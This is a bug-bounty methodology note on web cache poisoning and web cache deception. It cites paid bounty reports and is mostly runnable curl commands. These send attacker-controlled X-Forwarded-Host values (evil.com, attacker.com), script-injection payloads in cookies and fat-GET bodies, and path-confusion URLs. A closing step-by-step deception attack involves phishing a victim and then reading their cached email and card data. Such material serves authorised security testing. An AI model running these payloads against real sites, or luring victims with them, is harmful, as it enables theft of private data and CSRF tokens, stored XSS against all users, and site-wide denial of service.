# Web Cache Poisoning & Deception (deep)

Two distinct bugs that share the cache. Paid patterns (H1): PayPal *DoS via web cache poisoning* **$9.7k**;
Shopify *host-header cache poisoning → DoS* **$2.9k**; Shopify *web cache deception → PII + CSRF-token
leak* **$800**; Glassdoor *poisoning → stored XSS*; GSA *poisoning → stored DOM-XSS defacement* **$750**;
OLX/Tradus *deception → user_id enumeration*.

## A. Cache POISONING — you inject, everyone else is served it
Find an **unkeyed** input (not part of the cache key) that still influences the response.

**Detect (Param Miner / manual):**
```bash
# add a cache buster, vary one unkeyed header, look for reflection + a cache HIT on the poisoned value
curl -s "https://target/path?cb=1" -H "X-Forwarded-Host: evil.com" | grep -i evil.com
curl -s "https://target/path?cb=1"        # second request: is evil.com served without the header? → poisoned
```
Watch `X-Cache: hit/miss`, `Age`, `CF-Cache-Status`, `Cache-Control`.

**High-value unkeyed inputs:** `X-Forwarded-Host`, `X-Forwarded-Scheme`/`-Proto`, `X-Host`,
`X-Forwarded-Server`, `X-Original-URL`, `X-Rewrite-URL`, custom `X-*` the app reflects, and **fat GET**
(a body/param on a cached GET). Also cookies that are reflected but unkeyed.

**Escalate:** reflected unkeyed header into an HTML/script context → **stored XSS to all users**; into a
redirect/`<base href>`/import URL → traffic hijack; into a broken resource → **DoS** (PayPal $9.7k,
Shopify $2.9k). Chain with request smuggling for cache poisoning without an unkeyed input.

## B. Cache DECEPTION — victim's private page gets cached as "static", you read it
The CDN caches by extension/path pattern; the app serves dynamic content at a path that *looks* static.
```
https://target/account/settings          → dynamic, private (your PII, CSRF token, session data)
https://target/account/settings/foo.css  → app still returns your settings, CDN caches it as CSS
```
**Path-confusion variants to try:** `/account.css`, `/account/x.css`, `/account%2f..%2fx.js`,
`/account;foo.css`, `/account/foo.js?x=1`, `/account#.css`, encoded `%2e`/`%2f` delimiters.

**Exploit flow:** lure the victim to `…/foo.css` (or the CDN caches it after any visit) → then **you** fetch
the same URL unauthenticated → you receive the victim's cached private response (PII, CSRF token, gdtoken —
Shopify $800). Confirm the response is cached (`Age`/`X-Cache: hit`) and contains *their* data, not yours.

## Proof-of-impact bar
Poisoning: show the injected payload/broken response served to a **different** session from cache.
Deception: show a **victim's** private data returned to an unauthenticated fetch of the static-looking URL.
A `Vary`/`Cache-Control: private` that already prevents caching = no bug. Impact ranges Medium (info
leak) → High/Critical (stored XSS to all users, CSRF-token theft → ATO, site-wide DoS).

---

## 2024+ CACHE ATTACK VARIANTS

### Cache Deception via Extension/Query Blindness
```bash
# CDN caches based on file extension; app ignores the extension/query and serves the user's account page
# Victim visits the URL → their account page is cached → attacker fetches and gets victim's data

# Extension tricks (CDN caches .css/.js files):
curl -si "https://target.com/api/profile?x=1.css" -H "Cookie: session=VICTIM"
# Then (unauthenticated):
curl -si "https://target.com/api/profile?x=1.css"  # does it return victim's data?

# Path suffix tricks:
curl -si "https://target.com/account;style.css" -H "Cookie: session=VICTIM"
curl -si "https://target.com/account%00.css" -H "Cookie: session=VICTIM"
curl -si "https://target.com/account/.js" -H "Cookie: session=VICTIM"

# UTM / tracking param (CDN ignores but serves same content):
curl -si "https://target.com/account?utm_source=x.css" -H "Cookie: session=VICTIM"
```

### Cache Key Normalization Differentials (Path-Based Poisoning)
```bash
# Test: does the CDN normalize paths differently from the app?

# Case normalization:
curl -si "https://target.com/Api/Profile" -H "X-Attacker-Header: poisoned"
# If CDN caches /api/profile for this request → poisoned response served to victim at /api/profile

# Dot-segment stripping:
curl -si "https://target.com/api/../api/profile" -H "X-Poison: evil"
curl -si "https://target.com/api/profile/./data" -H "X-Poison: evil"

# Double slash:
curl -si "https://target.com//api/profile" -H "X-Unkeyed: evil"

# Encoded slash:
curl -si "https://target.com/api%2fprofile" -H "X-Unkeyed: evil"

# Port in cache key:
curl -si "https://target.com:443/api/profile" -H "X-Forwarded-Host: attacker.com"
```

### Header-Based Cache Poisoning
```bash
# X-Forwarded-Host reflected in response and cached without it being a cache key:
curl -si "https://target.com/" \
  -H "X-Forwarded-Host: attacker.com" | grep -i "location\|href\|src\|attacker"
# If the response reflects attacker.com in a resource URL and is cached:
# All users fetching that cached response get resources loaded from attacker.com → stored XSS

# X-Forwarded-Proto reflected:
curl -si "https://target.com/page" \
  -H "X-Forwarded-Proto: javascript" | grep -i "javascript"

# Unkeyed Cookie reflected in response:
curl -si "https://target.com/" \
  -H "Cookie: lang=<script>alert(1)</script>" | grep -i "script"
# If lang cookie value appears in the response without sanitization and is not a cache key:
# Poison once → all users get XSS'd

# Fat GET (body on GET request used in response but not in cache key):
curl -si -X GET "https://target.com/api/data" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "callback=<script>alert(1)</script>"
```

### Vary Header Gaps
```bash
# Missing Vary: Cookie → credentialed responses cached and served to unauthenticated users:
curl -si "https://target.com/api/profile" -H "Cookie: session=VICTIM" | grep -i "vary\|cache"
# If no Vary: Cookie → the authenticated response may be cached and served without auth

# Missing Vary: Origin → CORS decision cached (see also cors-additions in web-misc.md):
curl -si "https://target.com/api/data" \
  -H "Origin: https://attacker.com" \
  -H "Cookie: session=VICTIM" | grep -i "vary\|access-control"

# Missing Vary: Accept-Language → responses differ by language but are cached without language key:
curl -si "https://target.com/" -H "Accept-Language: fr" | grep -i "vary"

# Vary: * means every request is unique — confirms no caching
```

### Web Cache Deception — Forcing Victim Cache Miss
```bash
# Step-by-step WCD attack:
# 1. Identify an authenticated endpoint returning personal data:
#    GET /api/account → returns {"email":"...","cards":[...],...}
# 2. Find a CDN-cached path pattern (e.g., /static/.css extension caches without auth):
# 3. Construct the deception URL:
#    https://target.com/api/account?x=.css  OR  https://target.com/api/account/.css
# 4. Send this URL to the victim (phishing, XSS, redirect)
# 5. Victim loads the URL → CDN caches the response (authenticated data)
# 6. Attacker fetches same URL (unauthenticated) → gets victim's cached data
# Proof: attacker receives victim's email/card data from the cached response
```
